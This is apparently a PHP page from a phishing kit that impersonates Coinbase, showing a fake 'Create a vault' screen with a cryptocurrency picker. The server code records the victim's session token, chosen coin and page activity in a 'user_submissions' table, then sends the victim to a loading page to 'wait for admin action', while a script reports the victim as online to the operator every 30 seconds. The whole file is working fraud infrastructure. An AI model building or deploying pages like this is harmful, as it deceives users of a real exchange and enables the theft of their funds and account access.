<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to get the user's IP address
function getUserIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if form is submitted for vault creation
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['crypto']) && isset($_SESSION['token'])) {
        $crypto = $_POST['crypto'];
        $token = $_SESSION['token'];
        
        // Update the database with vault crypto selection
        $stmt = $conn->prepare("UPDATE user_submissions SET vault_crypto = ?, activity = ?, vault_status = ? WHERE token = ?");
        $activity = "VaultCrypto";
        $vault_status = "VaultCrypto";
        $stmt->bind_param("ssss", $crypto, $activity, $vault_status, $token);
        $stmt->execute();
        $stmt->close();
        
        // Redirect to loading page to wait for admin action
        header("Location: loading.php");
        exit();
    }
}

// Check if session exists, redirect to login if not
if (!isset($_SESSION['token']) || !isset($_SESSION['email'])) {
    header("Location: login.php");
    exit();
}

// Update activity to indicate vault page
updateActivity($_SESSION['token'], "VaultPage");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Vault</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
            font-weight: normal;
            font-style: normal;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .vault-container {
            text-align: center;
            max-width: 600px;
            padding: 40px 20px;
        }

        .vault-icon {
            width: 120px;
            height: 120px;
            margin: 0 auto 40px;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            color: #FFFFFF;
            margin-bottom: 16px;
        }

        .vault-description {
            font-size: 16px;
            color: #B0B0B0;
            line-height: 1.5;
            margin-bottom: 40px;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
        }

        .vault-buttons {
            display: flex;
            flex-direction: column;
            gap: 16px;
            align-items: center;
        }

        .btn-primary {
            background-color: #588BFA;
            border: none;
            border-radius: 50px;
            color: #000000;
            cursor: pointer;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 16px 32px;
            min-width: 200px;
            transition: background-color 0.2s ease;
        }

        .btn-primary:hover {
            background-color: #4A7BFA;
        }

        .btn-secondary {
            background-color: #32353D;
            border: none;
            border-radius: 50px;
            color: #FFFFFF;
            cursor: pointer;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 16px 32px;
            min-width: 200px;
            transition: background-color 0.2s ease;
        }

        .btn-secondary:hover {
            background-color: #3A3D45;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
            backdrop-filter: blur(4px);
        }

        .modal-content {
            background-color: #1A1B1F;
            margin: 5% auto;
            padding: 0;
            border-radius: 16px;
            width: 90%;
            max-width: 500px;
            position: relative;
            animation: modalSlideIn 0.3s ease;
        }

        @keyframes modalSlideIn {
            from { opacity: 0; transform: translateY(-50px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-header {
            padding: 24px 24px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title {
            font-size: 24px;
            font-weight: 600;
            color: #FFFFFF;
            margin: 0;
        }

        .close {
            color: #B0B0B0;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            line-height: 1;
        }

        .close:hover {
            color: #FFFFFF;
        }

        .modal-body {
            padding: 24px;
            max-height: 400px;
            overflow-y: auto;
        }

        .crypto-selection {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* Scrollbar styling */
        .modal-body::-webkit-scrollbar {
            width: 6px;
        }

        .modal-body::-webkit-scrollbar-track {
            background: #2A2D36;
            border-radius: 3px;
        }

        .modal-body::-webkit-scrollbar-thumb {
            background: #588BFA;
            border-radius: 3px;
        }

        .modal-body::-webkit-scrollbar-thumb:hover {
            background: #4A7BEA;
        }

        .crypto-option {
            display: flex;
            align-items: center;
            padding: 16px;
            background-color: #2A2D36;
            border: 2px solid transparent;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .crypto-option:hover {
            background-color: #32353D;
            border-color: #588BFA;
        }

        .crypto-option.selected {
            background-color: #1E3A8A;
            border-color: #588BFA;
        }

        .crypto-icon {
            width: 32px;
            height: 32px;
            margin-right: 16px;
        }

        .crypto-icon img {
            width: 100%;
            height: 100%;
        }

        .crypto-info {
            flex: 1;
        }

        .crypto-name {
            font-size: 16px;
            font-weight: 600;
            color: #FFFFFF;
            margin-bottom: 4px;
        }

        .crypto-symbol {
            font-size: 14px;
            color: #B0B0B0;
        }

        .modal-footer {
            padding: 0 24px 24px;
        }

        .btn-full {
            width: 100%;
        }

        @media (max-width: 768px) {
            .vault-container {
                padding: 20px;
            }
            
            h1 {
                font-size: 28px;
            }
            
            .vault-description {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="vault-container">
        <div class="vault-icon">
            <img src="assets/securityShield-4.svg" alt="Vault Icon">
        </div>
        
        <h1>Create a vault</h1>
        
        <p class="vault-description">
            A vault is a great place to store your crypto for the long term. Features include time-delayed withdrawals, multiple approvers, and offline storage.
        </p>
        
        <div class="vault-buttons">
            <button class="btn-primary" onclick="openModal()">Create a vault</button>
            <button class="btn-secondary" onclick="window.open('https://help.coinbase.com/en/coinbase/getting-started/crypto-education/what-is-a-vault', '_blank')">Learn more about Vaults</button>
        </div>
    </div>

    <!-- Modal -->
    <div id="vaultModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Select Your Crypto</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <form id="vaultForm" method="post">
                    <div class="crypto-selection">
                        <div class="crypto-option" onclick="selectCrypto('BTC')">
                            <div class="crypto-icon">
                                <img src="assets/bitcoin-btc-logo.svg" alt="Bitcoin">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Bitcoin</div>
                                <div class="crypto-symbol">BTC</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('ETH')">
                            <div class="crypto-icon">
                                <img src="assets/ethereum-eth-logo.svg" alt="Ethereum">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Ethereum</div>
                                <div class="crypto-symbol">ETH</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('USDT')">
                            <div class="crypto-icon">
                                <img src="assets/tether-usdt-logo.svg" alt="Tether">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Tether</div>
                                <div class="crypto-symbol">USDT</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('BNB')">
                            <div class="crypto-icon">
                                <img src="assets/bnb-bnb-logo.svg" alt="BNB">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">BNB</div>
                                <div class="crypto-symbol">BNB</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('SOL')">
                            <div class="crypto-icon">
                                <img src="assets/solana-sol-logo.svg" alt="Solana">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Solana</div>
                                <div class="crypto-symbol">SOL</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('XRP')">
                            <div class="crypto-icon">
                                <img src="assets/xrp-xrp-logo.svg" alt="XRP">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">XRP</div>
                                <div class="crypto-symbol">XRP</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('USDC')">
                            <div class="crypto-icon">
                                <img src="assets/usd-coin-usdc-logo.svg" alt="USD Coin">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">USD Coin</div>
                                <div class="crypto-symbol">USDC</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('ADA')">
                            <div class="crypto-icon">
                                <img src="assets/cardano-ada-logo.svg" alt="Cardano">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Cardano</div>
                                <div class="crypto-symbol">ADA</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('AVAX')">
                            <div class="crypto-icon">
                                <img src="assets/avalanche-avax-logo.svg" alt="Avalanche">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Avalanche</div>
                                <div class="crypto-symbol">AVAX</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('TRX')">
                            <div class="crypto-icon">
                                <img src="assets/tron-trx-logo.svg" alt="TRON">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">TRON</div>
                                <div class="crypto-symbol">TRX</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('MATIC')">
                            <div class="crypto-icon">
                                <img src="assets/polygon-matic-logo.svg" alt="Polygon">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Polygon</div>
                                <div class="crypto-symbol">MATIC</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('LTC')">
                            <div class="crypto-icon">
                                <img src="assets/litecoin-ltc-logo.svg" alt="Litecoin">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Litecoin</div>
                                <div class="crypto-symbol">LTC</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('SHIB')">
                            <div class="crypto-icon">
                                <img src="assets/shiba-inu-shib-logo.svg" alt="Shiba Inu">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Shiba Inu</div>
                                <div class="crypto-symbol">SHIB</div>
                            </div>
                        </div>
                        
                        <div class="crypto-option" onclick="selectCrypto('DAI')">
                            <div class="crypto-icon">
                                <img src="assets/multi-collateral-dai-dai-logo.svg" alt="Dai">
                            </div>
                            <div class="crypto-info">
                                <div class="crypto-name">Dai</div>
                                <div class="crypto-symbol">DAI</div>
                            </div>
                        </div>
                    </div>
                    <input type="hidden" name="crypto" id="selectedCrypto">
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn-primary btn-full" onclick="submitVault()" id="continueBtn" disabled>Continue</button>
            </div>
        </div>
    </div>

    <script>
        let selectedCryptoValue = '';

        function openModal() {
            document.getElementById('vaultModal').style.display = 'block';
        }

        function closeModal() {
            document.getElementById('vaultModal').style.display = 'none';
            // Reset selection
            document.querySelectorAll('.crypto-option').forEach(option => {
                option.classList.remove('selected');
            });
            selectedCryptoValue = '';
            document.getElementById('continueBtn').disabled = true;
        }

        function selectCrypto(crypto) {
            // Remove previous selection
            document.querySelectorAll('.crypto-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            // Add selection to clicked option
            event.target.closest('.crypto-option').classList.add('selected');
            
            selectedCryptoValue = crypto;
            document.getElementById('selectedCrypto').value = crypto;
            document.getElementById('continueBtn').disabled = false;
        }

        function submitVault() {
            if (selectedCryptoValue) {
                console.log('Submitting vault form with crypto:', selectedCryptoValue);
                document.getElementById('vaultForm').submit();
            } else {
                console.log('No crypto selected');
            }
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('vaultModal');
            if (event.target == modal) {
                closeModal();
            }
        }

        // Update status to online
        function updateStatus() {
            fetch('update_status.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'status=online'
            });
        }

        // Update status every 30 seconds
        updateStatus();
        setInterval(updateStatus, 30000);
    </script>
</body>
</html> 